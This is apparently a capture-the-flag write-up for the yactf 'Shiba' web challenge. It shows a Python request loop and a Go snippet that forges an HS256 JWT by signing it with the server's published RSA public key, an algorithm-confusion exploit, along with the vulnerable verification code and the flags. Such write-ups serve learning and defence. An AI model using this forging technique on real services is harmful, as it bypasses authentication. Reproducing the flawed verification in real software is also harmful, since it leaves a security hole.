# Shiba

## Baby Challenge

The first challenge was simply to "press Boop 1500 times".

We could automate the API requests.

```python
import requests

session = requests.Session()
session.get('https://shiba.yactf.ru/')

for i in range(1500):
    r = session.get('https://shiba.yactf.ru/api/boop')
    print(i, r.text)

r = session.get('https://shiba.yactf.ru/')
print(r.text)
print(session.cookies.get_dict())
```

After 1500 iterations, we get the flag.

```
Gratz! Baby flag: yactf{b00p_bO0p_b0op_b00p_b0Op1Ty_bO0p}. But your real-flag is in another castle: at 1501 boops
```

## Hard Challenge

The goal of this challenge is to somehow get 1501 "boops". However, the server stops incrementing the "boops" after reaching 1500.

We could firstly see that the server uses JWT tokens to count the number of "boops".

![](<../../.gitbook/assets/Screenshot 2022-02-16 at 11.33.06 PM.png>)

The public key is provided in `/signature/key.pub`, which is hinted by `/robots.txt`.

```go
r := gin.Default()
r.Static("/static", "./static")
r.Static("/images", "./images")
r.Static("/signature", "./signature")
r.LoadHTMLGlob("templates/*.html")
r.GET("/robots.txt", func(c *gin.Context) {
    c.String(200, "//TODO PublicKey at /signature/key.pub")
})
```

Let's take a look at how the server processes the supplied JWT. The server accepts both HS256 and RS256 tokens, but notice that the public key, `verifyKey` is used to validate the JWT signature in both cases.

```go
verifyBytes, _ := ioutil.ReadFile(pubKeyPath)
verifyKey, _ = jwt.ParseRSAPublicKeyFromPEM(verifyBytes)

...

token, err := jwt.ParseWithClaims(cookie, &MyCustomClaims{}, func(token *jwt.Token) (interface{}, error) {
    if token.Method == jwt.SigningMethodHS256 {
        return x509.MarshalPKCS1PublicKey(verifyKey), nil
    }
    if token.Method == jwt.SigningMethodRS256 {
        return verifyKey, nil
    }
    return verifyKey, nil
})
```

This is interesting because we have knowledge of the public key. HMAC, by definition, does not have the concept of a public/private key pair - the signing and verification must be performed using the same secret key.

The private key, `signKey` is used to sign RS256 tokens, but note that we could just as easily generate our own HS256 token, using the known public key. This would then be validated by the server since the same public key is used for validation.

```go
signBytes, _ := ioutil.ReadFile(privKeyPath)
signKey, _ = jwt.ParseRSAPrivateKeyFromPEM(signBytes)

...

// Return new JWT TOKEN
returnClaims := MyCustomClaims{
	boops,
	jwt.StandardClaims{
		ExpiresAt: time.Now().Unix() + 15000,
		Issuer:    "Boops Company",
	},
}
returnToken := jwt.NewWithClaims(jwt.SigningMethodRS256, returnClaims)
tokenString, _ := returnToken.SignedString(signKey)
```

To do this, we simply sign a token with the public `verifyKey`.

```go
test := jwt.NewWithClaims(jwt.SigningMethodHS256, MyCustomClaims{
    1501,
    jwt.StandardClaims{
        ExpiresAt: time.Now().Unix() + 15000,
        Issuer:    "Boops Company",
    },
})
fmt.Println(test.SignedString(x509.MarshalPKCS1PublicKey(verifyKey)))
```

The flag is `yactf{Oh_G00d_pOor_ch3emS_5o_m4ny_boOpS}`.
